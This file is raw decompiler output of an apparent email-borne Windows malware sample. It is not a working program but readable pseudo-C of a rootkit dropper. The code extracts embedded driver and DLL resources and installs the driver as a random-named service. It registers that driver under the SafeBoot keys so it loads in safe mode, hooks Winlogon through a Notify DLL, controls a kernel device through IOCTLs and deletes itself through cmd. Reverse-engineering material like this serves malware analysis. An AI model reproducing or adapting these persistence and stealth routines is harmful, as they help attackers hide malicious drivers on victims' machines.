/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0820/ia32_pe/subject.exe'
 */

/*	Procedure: 0x080012DA - 0x080012E7
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L080012DA()
{



    asm("into");
    ebp = ebp + 1;
    *L00000001 = L00006308();
}

/*	Procedure: 0x08001340 - 0x08001380
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L08001340(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    for(*(ebp - 4) = A8; 1; Ac = Ac + 1) {
        A10 = A10 - 1;
        if(A10 == 0) {
            break;
        }
        *A8 = *Ac;
        A8 = A8 + 1;
    }
    return(*(ebp - 4));
}

/*	Procedure: 0x08001381 - 0x0800138F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L08001381()
{



}

/*	Procedure: 0x08001390 - 0x080013C5
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L08001390(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    for(*(ebp - 4) = A8; 1; A8 = A8 + 1) {
        A10 = A10 - 1;
        if(A10 == 0) {
            break;
        }
        *A8 = Ac;
    }
    return(*(ebp - 4));
}

/*	Procedure: 0x080013C6 - 0x080013CF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L080013C6()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x080013D0 - 0x0800140C
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L080013D0(A8)
/* unknown */ void  A8;
{



    if(*L08003008 == 0) {
        *L08003008 = *__imp__GetProcessHeap();
    }
    eax = *L08003008 != 0 ? *__imp__HeapAlloc( *L08003008, 0, A8) : 0;
}

/*	Procedure: 0x0800140D - 0x0800141F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0800140D()
{



}

/*	Procedure: 0x08001420 - 0x08001444
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L08001420(A8)
/* unknown */ void  A8;
{



    if(*L08003008 != 0) {
        eax = *__imp__HeapFree( *L08003008, 0, A8);
    }
}

/*	Procedure: 0x08001445 - 0x0800144F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L08001445()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x08001450 - 0x0800158B
 *	Argument size: -632
 *	Local size: 632
 *	Save regs size: 0
 */

L08001450()
{
	/* unknown */ void  Vfffffd88;
	/* unknown */ void  Vfffffd89;
	/* unknown */ void  Vfffffe90;
	/* unknown */ void  Vfffffe94;
	/* unknown */ void  Vfffffedc;
	/* unknown */ void  Vfffffee0;
	/* unknown */ void  Vfffffef0;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = *L08003000 ^ ebp;
    Vfffffedc = & Vfffffd88;
    Vfffffe90 = 68;
    L08001390( & Vfffffe94, 0, 64);
    (save) *__imp__GetCommandLineA();
    (save) & Vfffffd88;
    *__imp__lstrcpyA();
    if(Vfffffd88 == 34) {
        (save) & Vfffffd88;
        *(ebp + *__imp__lstrlenA() + -634) = 0;
        Vfffffedc = & Vfffffd89;
    }
    (save)260;
    (save)Vfffffedc;
    (save)Vfffffedc;
    if(*__imp__GetShortPathNameA() != 0) {
        (save)"/c del ";
        (save) & Vfffffef0;
        *__imp__lstrcpyA();
        (save)Vfffffedc;
        (save) & Vfffffef0;
        *__imp__lstrcatA();
        (save)" >> NUL";
        (save) & Vfffffef0;
        *__imp__lstrcatA();
        (save)260;
        (save)Vfffffedc;
        (save)"ComSpec";
        *__imp__GetEnvironmentVariableA();
        (save) & Vfffffee0;
        (save) & Vfffffe90;
        (save)0;
        (save)0;
        (save)134217728;
        (save)0;
        (save)0;
        (save)0;
        (save) & Vfffffef0;
        (save)Vfffffedc;
        if(*__imp__CreateProcessA() != 0) {
            (save)0;
            *__imp__ExitProcess();
        }
    }
    eax = 0;
    ecx = Vfffffffc ^ ebp;
    return(L08001FF8());
}

/*	Procedure: 0x0800158C - 0x0800159F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0800158C()
{



}

/*	Procedure: 0x080015A0 - 0x08001666
 *	Argument size: -4
 *	Local size: 20
 *	Save regs size: 0
 */

L080015A0(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffff4 = 0;
    Vfffffffc = 0;
    if(Ac != 0) {
        (save)"BIN";
        (save)Ac & 65535;
        (save)A8;
        Vfffffffc = *__imp__FindResourceA();
    } else {
        if(A10 != 0) {
            (save)"BIN";
            (save)A10;
            (save)A8;
            Vfffffffc = *__imp__FindResourceA();
        }
    }
    (save)Vfffffffc;
    (save)A8;
    Vfffffff0 = *__imp__LoadResource();
    (save)Vfffffffc;
    (save)A8;
    Vfffffff8 = *__imp__SizeofResource();
    if(Vfffffff0 != 0) {
        (save)Vfffffff0;
        Vffffffec = *__imp__LockResource();
        if(Vffffffec != 0) {
            *A14 = Vfffffff8;
            Vfffffff4 = L080013D0(Vfffffff8);
            L08001340(Vfffffff4, Vffffffec, Vfffffff8);
        }
        *__imp__FreeResource(Vfffffff0);
    }
    return(Vfffffff4);
}

/*	Procedure: 0x08001667 - 0x0800166F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L08001667()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x08001670 - 0x080016D7
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L08001670(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    if(Ac != 0) {
        if(A10 == 0) {
            goto L080016d0;
        }
        (save)0;
        (save)128;
        (save)2;
        (save)0;
        (save)0;
        (save)1073741824;
        (save)A8;
        *(ebp - 4) = *__imp__CreateFileA();
        if(*(ebp - 4) == -1) {
            goto L080016d0;
        }
        (save)0;
        (save) & A10;
        (save)A10;
        (save)Ac;
        (save) *(ebp - 4);
        *__imp__WriteFile();
        *__imp__CloseHandle( *(ebp - 4));
        eax = 1;
    } else {
L080016d0:
        eax = 0;
    }
}

/*	Procedure: 0x080016D8 - 0x080016DF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L080016D8()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x080016E0 - 0x080016F8
 *	Argument size: -8
 *	Local size: 8
 *	Save regs size: 0
 */

L080016E0()
{
	/* unknown */ void  Vfffffff8;



    *__imp__QueryPerformanceCounter( & Vfffffff8);
    return(Vfffffff8);
}

/*	Procedure: 0x080016F9 - 0x080016FF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L080016F9()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x08001700 - 0x080017CB
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L08001700(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    L080016E0();
    eax = ax & 65535;
    asm("cdq");
    *Ac = 25 / 25 % 25 / 25 + 65;
    L080016E0();
    eax = ax & 65535;
    asm("cdq");
    *(Ac + 1) = 25 / 25 % 25 / 25 + 97;
    L080016E0();
    eax = ax & 65535;
    asm("cdq");
    *(Ac + 2) = 25 / 25 % 25 / 25 + 97;
    L080016E0();
    eax = ax & 65535;
    asm("cdq");
    *(Ac + 3) = 9 / 9 % 9 / 9 + 48;
    L080016E0();
    eax = ax & 65535;
    asm("cdq");
    *(Ac + 4) = 9 / 9 % 9 / 9 + 48;
    *(Ac + 5) = 0;
    (save)260;
    (save)A8;
    (save)"SystemRoot";
    *__imp__GetEnvironmentVariableA();
    (save)"\System32\drivers\";
    (save)A8;
    *__imp__lstrcatA();
    *__imp__lstrcatA();
    return(*__imp__lstrcatA(A8, ".sys", A8, Ac));
}

/*	Procedure: 0x080017CC - 0x080017DF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L080017CC()
{



}

/*	Procedure: 0x080017E0 - 0x0800180B
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L080017E0(A8)
/* unknown */ void  A8;
{



    *__imp__GetEnvironmentVariableA();
    return(*__imp__lstrcatA(A8, "\System32\WinNt32.dll", "SystemRoot", A8, 260));
}

/*	Procedure: 0x0800180C - 0x0800181F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0800180C()
{



}

/*	Procedure: 0x08001820 - 0x080018E4
 *	Argument size: -8
 *	Local size: 16
 *	Save regs size: 0
 */

L08001820(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffff8 = 1;
    (save)983103;
    (save)0;
    (save)0;
    Vfffffff0 = *__imp__OpenSCManagerA();
    (save)983551;
    (save)Ac;
    (save)Vfffffff0;
    Vfffffffc = *__imp__OpenServiceA();
    if(Vfffffffc == 0) {
        (save)0;
        (save)0;
        (save)0;
        (save)0;
        (save)0;
        (save)A8;
        (save)0;
        (save)3;
        (save)1;
        (save)983551;
        (save)0;
        (save)Ac;
        (save)Vfffffff0;
        Vfffffffc = *__imp__CreateServiceA();
    }
    if(Vfffffffc != 0) {
        (save)0;
        (save)0;
        (save)Vfffffffc;
        if(*__imp__StartServiceA() == 0) {
            goto L080018aa;
        }
        Vfffffff8 = 1;
    } else {
L080018aa:
        Vfffffff4 = *__imp__GetLastError();
        Vfffffff8 = Vfffffff4 == 1056 ? 1 : 0;
    }
    if(Vfffffffc != 0) {
        *__imp__CloseServiceHandle(Vfffffffc);
    }
    return(Vfffffff8);
}

/*	Procedure: 0x080018E5 - 0x080018EF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L080018E5()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x080018F0 - 0x080019FA
 *	Argument size: -520
 *	Local size: 524
 *	Save regs size: 0
 */

L080018F0(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vfffffdf4;
	/* unknown */ void  Vfffffdf8;
	/* unknown */ void  Vfffffef8;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = *L08003000 ^ ebp;
    (save)"SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\";
    (save) & Vfffffdf8;
    *__imp__lstrcpyA();
    (save)A8;
    (save) & Vfffffdf8;
    *__imp__lstrcatA();
    (save)".sys";
    (save) & Vfffffdf8;
    *__imp__lstrcatA();
    (save)"SYSTEM\CurrentControlSet\Control\SafeBoot\Network\";
    (save) & Vfffffef8;
    *__imp__lstrcpyA();
    (save)A8;
    (save) & Vfffffef8;
    *__imp__lstrcatA();
    (save)".sys";
    (save) & Vfffffef8;
    *__imp__lstrcatA();
    (save) & Vfffffdf4;
    (save) & Vfffffdf8;
    (save)-2147483646;
    *__imp__RegCreateKeyA();
    (save)8;
    (save)"Driver";
    (save)1;
    (save)0;
    (save)Vfffffdf4;
    *__imp__RegSetValueA();
    (save)Vfffffdf4;
    *__imp__RegCloseKey();
    (save) & Vfffffdf4;
    (save) & Vfffffef8;
    (save)-2147483646;
    *__imp__RegCreateKeyA();
    (save)8;
    (save)"Driver";
    (save)1;
    (save)0;
    (save)Vfffffdf4;
    *__imp__RegSetValueA();
    (save)Vfffffdf4;
    *__imp__RegCloseKey();
    ecx = Vfffffffc ^ ebp;
    return(L08001FF8());
}

/*	Procedure: 0x080019FB - 0x080019FF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L080019FB()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x08001A00 - 0x08001B90
 *	Argument size: -780
 *	Local size: 788
 *	Save regs size: 0
 */

L08001A00(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vfffffcec;
	/* unknown */ void  Vfffffcf0;
	/* unknown */ void  Vfffffdf4;
	/* unknown */ void  Vfffffdf8;
	/* unknown */ void  Vfffffef8;
	/* unknown */ void  Vfffffefc;
	/* unknown */ void  Vffffff00;
	/* unknown */ void  Vffffff02;
	/* unknown */ void  Vffffff03;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffff8 = *L08003000 ^ ebp;
    (save)Ac;
    (save) & Vfffffdf8;
    *__imp__lstrcpyA();
    (save)A8;
    (save) & Vfffffdf8;
    *__imp__lstrcatA();
    (save) & Vfffffdf4;
    (save) & Vfffffdf8;
    (save)-2147483646;
    *__imp__RegCreateKeyA();
    Vfffffcec = 1;
    (save)4;
    (save) & Vfffffcec;
    (save)4;
    (save)0;
    (save)"Type";
    (save)Vfffffdf4;
    *__imp__RegSetValueExA();
    Vfffffffc = 0;
    (save)4;
    (save) & Vfffffffc;
    (save)4;
    (save)0;
    (save)"Start";
    (save)Vfffffdf4;
    *__imp__RegSetValueExA();
    (save)"System32\Drivers\";
    (save) & Vfffffcf0;
    *__imp__lstrcpyA();
    (save)A8;
    (save) & Vfffffcf0;
    *__imp__lstrcatA();
    (save)".sys";
    (save) & Vfffffcf0;
    *__imp__lstrcatA();
    (save) & Vfffffcf0;
    (save) *__imp__lstrlenA() + 1;
    (save) & Vfffffcf0;
    (save)1;
    (save)0;
    (save)"ImagePath";
    (save)Vfffffdf4;
    *__imp__RegSetValueExA();
    Vfffffef8 = *"SCSI Class";
    Vfffffefc = *" Class";
    Vffffff00 = *"ss";
    Vffffff02 = *"";
    L08001390( & Vffffff03, 0, 245);
    (save) & Vfffffef8;
    (save) *__imp__lstrlenA() + 1;
    (save) & Vfffffef8;
    (save)1;
    (save)0;
    (save)"Group";
    (save)Vfffffdf4;
    *__imp__RegSetValueExA();
    (save)Vfffffdf4;
    *__imp__RegCloseKey();
    ecx = Vfffffff8 ^ ebp;
    return(L08001FF8());
}

/*	Procedure: 0x08001B91 - 0x08001B9F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L08001B91()
{



}

/*	Procedure: 0x08001BA0 - 0x08001C61
 *	Argument size: -20
 *	Local size: 20
 *	Save regs size: 0
 */

L08001BA0()
{
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffff0 = "WinNt32.dll";
    Vfffffff4 = "WLEventStartShell";
    Vfffffffc = 0;
    Vffffffec = 0;
    (save) & Vfffffff8;
    (save)"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\WinNt32";
    (save)-2147483646;
    *__imp__RegCreateKeyA();
    (save)Vfffffff0;
    (save) *__imp__lstrlenA() + 1;
    (save)Vfffffff0;
    (save)1;
    (save)0;
    (save)"DLLName";
    (save)Vfffffff8;
    *__imp__RegSetValueExA();
    (save)Vfffffff4;
    (save) *__imp__lstrlenA() + 1;
    (save)Vfffffff4;
    (save)1;
    (save)0;
    (save)"StartShell";
    (save)Vfffffff8;
    *__imp__RegSetValueExA();
    (save)4;
    (save) & Vfffffffc;
    (save)4;
    (save)0;
    (save)"Impersonate";
    (save)Vfffffff8;
    *__imp__RegSetValueExA();
    (save)4;
    (save) & Vffffffec;
    (save)4;
    (save)0;
    (save)"Asynchronous";
    (save)Vfffffff8;
    *__imp__RegSetValueExA();
    return(*__imp__RegCloseKey(Vfffffff8));
}

/*	Procedure: 0x08001C62 - 0x08001C6F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L08001C62()
{



}

/*	Procedure: 0x08001C70 - 0x08001C93
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L08001C70()
{



    return(*__imp__CreateFileA("\\.\Prot2", -1073741824, 0, 0, 2, 128, 0));
}

/*	Procedure: 0x08001C94 - 0x08001C9F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L08001C94()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x08001CA0 - 0x08001FF2
 *	Argument size: -1024
 *	Local size: 1024
 *	Save regs size: 0
 */

__entry_point__()
{
	/* unknown */ void  Vfffffc00;
	/* unknown */ void  Vfffffc04;
	/* unknown */ void  Vfffffc08;
	/* unknown */ void  Vfffffc0c;
	/* unknown */ void  Vfffffc10;
	/* unknown */ void  Vfffffc14;
	/* unknown */ void  Vfffffc18;
	/* unknown */ void  Vfffffc1c;
	/* unknown */ void  Vfffffc20;
	/* unknown */ void  Vfffffc24;
	/* unknown */ void  Vfffffc28;
	/* unknown */ void  Vfffffc2c;
	/* unknown */ void  Vfffffc30;
	/* unknown */ void  Vfffffc34;
	/* unknown */ void  Vfffffc38;
	/* unknown */ void  Vfffffc3c;
	/* unknown */ void  Vfffffc40;
	/* unknown */ void  Vfffffcd0;
	/* unknown */ void  Vfffffdd8;
	/* unknown */ void  Vfffffddc;
	/* unknown */ void  Vfffffde0;
	/* unknown */ void  Vfffffee8;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffff4 = *L08003000 ^ ebp;
    Vfffffc38 = 148;
    (save)0;
    Vfffffdd8 = *__imp__GetModuleHandleA();
    (save) & Vfffffc38;
    *__imp__GetVersionExA();
    if(Vfffffc3c == 5) {
        if(Vfffffc40 != 0) {
            goto L08001cf8;
        }
        Vfffffc08 = 1;
    } else {
L08001cf8:
        Vfffffc08 = 0;
    }
    Vfffffffc = Vfffffc08;
    if(Vfffffc3c == 5) {
        if(Vfffffc40 != 1) {
            goto L08001d29;
        }
        Vfffffc04 = 1;
    } else {
L08001d29:
        Vfffffc04 = 0;
    }
    Vfffffddc = Vfffffc04;
    if(Vfffffc3c == 5) {
        if(Vfffffc40 != 2) {
            goto L08001d5d;
        }
        Vfffffc00 = 1;
    } else {
L08001d5d:
        Vfffffc00 = 0;
    }
    Vfffffff8 = Vfffffc00;
    L080017E0( & Vfffffee8);
    L08001700( & Vfffffcd0, & Vfffffde0);
    if(Vfffffffc != 0 || Vfffffddc != 0 || Vfffffff8 != 0) {
        (save) & Vfffffc30;
        (save)0;
        (save)101;
        (save)Vfffffdd8;
        Vfffffc34 = L080015A0();
        (save) & Vfffffc2c;
        (save)0;
        (save)102;
        (save)Vfffffdd8;
        Vfffffc24 = L080015A0();
        Vfffffc28 = 0;
        Vfffffc20 = L08001C70();
        if(Vfffffc20 != -1) {
            (save)0;
            (save) & Vfffffc1c;
            (save)0;
            (save)0;
            (save)Vfffffc30;
            (save)Vfffffc34;
            (save)-1660410816;
            (save)Vfffffc20;
            *__imp__DeviceIoControl();
            (save)0;
            (save) & Vfffffc1c;
            (save)0;
            (save)0;
            (save)Vfffffc2c;
            (save)Vfffffc24;
            (save)-1660410812;
            (save)Vfffffc20;
            *__imp__DeviceIoControl();
            (save)Vfffffc20;
            *__imp__CloseHandle();
        } else {
            if(L08001670( & Vfffffee8, Vfffffc24, Vfffffc2c) == 1) {
                Vfffffc28 = 1;
            }
            L08001670( & Vfffffcd0, Vfffffc34, Vfffffc30);
            L08001BA0();
            (save) & Vfffffde0;
            L080018F0();
            (save) & Vfffffde0;
            (save) & Vfffffcd0;
            L08001820();
            (save)500;
            *__imp__Sleep();
            (save)"SYSTEM\ControlSet001\Services\";
            (save) & Vfffffde0;
            L08001A00();
            (save)"SYSTEM\ControlSet002\Services\";
            (save) & Vfffffde0;
            L08001A00();
            (save)500;
            *__imp__Sleep();
            Vfffffc18 = L08001C70();
            if(Vfffffc18 != -1) {
                (save)0;
                (save) & Vfffffc14;
                (save)0;
                (save)0;
                (save)Vfffffc2c;
                (save)Vfffffc24;
                (save)-1660410812;
                (save)Vfffffc18;
                *__imp__DeviceIoControl();
                (save)0;
                (save) & Vfffffc14;
                (save)0;
                (save)0;
                (save)0;
                (save)0;
                (save)-1660410752;
                (save)Vfffffc18;
                *__imp__DeviceIoControl();
                (save)Vfffffc18;
                *__imp__CloseHandle();
            }
        }
        L08001420(Vfffffc34);
        L08001420(Vfffffc24);
        if(Vfffffc28 != 0) {
            (save) & Vfffffee8;
            Vfffffc10 = *__imp__LoadLibraryA();
            if(Vfffffc10 != 0) {
                (save)"Run";
                (save)Vfffffc10;
                Vfffffc0c = *__imp__GetProcAddress();
                if(Vfffffc0c != 0) {
                    Vfffffc0c();
                }
            }
        }
    }
    L08001450();
    ecx = Vfffffff4 ^ ebp;
    return(L08001FF8());
}

/*	Procedure: 0x08001FF3 - 0x08001FF7
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L08001FF3()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

stack space not deallocated on return
/*	Procedure: 0x08001FF8 - 0x080020EB
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L08001FF8()
{



    if(ecx == *L08003000) {
        asm("rep ret");
    }
    goto L0800200c;
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
L0800200c:
    (save)ebp;
    ebp = esp;
    esp = esp - 800;
    (save)edi;
    *L08003110 = eax;
    *L0800310C = ecx;
    *L08003108 = edx;
    *L08003104 = ebx;
    *L08003100 = esi;
    *L080030FC = edi;
    *L08003128 = ss;
    *L0800311C = cs;
    *L080030F8 = ds;
    *L080030F4 = es;
    *L080030F0 = fs;
    *L080030EC = gs;
    asm("pushf");
    (restore) *L08003120;
    eax = *(ebp + 4);
    *L08003124 = ebp + 4 + 4;
    *L08003118 = eax;
    *L08003060 = 65537;
    ecx = *(ebp + 4 - 4);
    *L0800301C = eax;
    *L08003114 = ecx;
    *L08003010 = -1073740791;
    *L08003014 = 1;
    *(ebp - 4) = *L08003000;
    *(ebp - 4) = *L08003004;
    *__imp__SetUnhandledExceptionFilter();
    *__imp__UnhandledExceptionFilter();
    *(ebp + -800) = 1;
    (restore)edi;
    (restore)ebp;
    return(*__imp__TerminateProcess( *__imp__GetCurrentProcess(), -1073740791, 0x80012c8, 0));
}

/*	Procedure: 0x080020EC - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L080020EC()
{



}

/* address  size  */
/* 0x08001000       0 */ /* unknown */ void 	__imp__CloseServiceHandle;
/* 0x08001004       0 */ /* unknown */ void 	__imp__StartServiceA;
/* 0x08001008       0 */ /* unknown */ void 	__imp__CreateServiceA;
/* 0x0800100c       0 */ /* unknown */ void 	__imp__OpenServiceA;
/* 0x08001010       0 */ /* unknown */ void 	__imp__OpenSCManagerA;
/* 0x08001014       0 */ /* unknown */ void 	__imp__RegCloseKey;
/* 0x08001018       0 */ /* unknown */ void 	__imp__RegSetValueA;
/* 0x0800101c       0 */ /* unknown */ void 	__imp__RegCreateKeyA;
/* 0x08001020       0 */ /* unknown */ void 	__imp__RegSetValueExA;
/* 0x08001028       0 */ /* unknown */ void 	__imp__HeapAlloc;
/* 0x0800102c       0 */ /* unknown */ void 	__imp__GetProcessHeap;
/* 0x08001030       0 */ /* unknown */ void 	__imp__HeapFree;
/* 0x08001034       0 */ /* unknown */ void 	__imp__ExitProcess;
/* 0x08001038       0 */ /* unknown */ void 	__imp__CreateProcessA;
/* 0x0800103c       0 */ /* unknown */ void 	__imp__GetEnvironmentVariableA;
/* 0x08001040       0 */ /* unknown */ void 	__imp__lstrcatA;
/* 0x08001044       0 */ /* unknown */ void 	__imp__GetShortPathNameA;
/* 0x08001048       0 */ /* unknown */ void 	__imp__lstrlenA;
/* 0x0800104c       0 */ /* unknown */ void 	__imp__lstrcpyA;
/* 0x08001050       0 */ /* unknown */ void 	__imp__GetCommandLineA;
/* 0x08001054       0 */ /* unknown */ void 	__imp__FreeResource;
/* 0x08001058       0 */ /* unknown */ void 	__imp__LockResource;
/* 0x0800105c       0 */ /* unknown */ void 	__imp__SizeofResource;
/* 0x08001060       0 */ /* unknown */ void 	__imp__LoadResource;
/* 0x08001064       0 */ /* unknown */ void 	__imp__FindResourceA;
/* 0x08001068       0 */ /* unknown */ void 	__imp__CloseHandle;
/* 0x0800106c       0 */ /* unknown */ void 	__imp__WriteFile;
/* 0x08001070       0 */ /* unknown */ void 	__imp__CreateFileA;
/* 0x08001074       0 */ /* unknown */ void 	__imp__QueryPerformanceCounter;
/* 0x08001078       0 */ /* unknown */ void 	__imp__GetLastError;
/* 0x0800107c       0 */ /* unknown */ void 	__imp__GetProcAddress;
/* 0x08001080       0 */ /* unknown */ void 	__imp__LoadLibraryA;
/* 0x08001084       0 */ /* unknown */ void 	__imp__Sleep;
/* 0x08001088       0 */ /* unknown */ void 	__imp__DeviceIoControl;
/* 0x0800108c       0 */ /* unknown */ void 	__imp__GetVersionExA;
/* 0x08001090       0 */ /* unknown */ void 	__imp__GetModuleHandleA;
/* 0x08001094       0 */ /* unknown */ void 	__imp__TerminateProcess;
/* 0x08001098       0 */ /* unknown */ void 	__imp__GetCurrentProcess;
/* 0x0800109c       0 */ /* unknown */ void 	__imp__UnhandledExceptionFilter;
/* 0x080010a0       0 */ /* unknown */ void 	__imp__SetUnhandledExceptionFilter;
/* 0x08001ca0       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
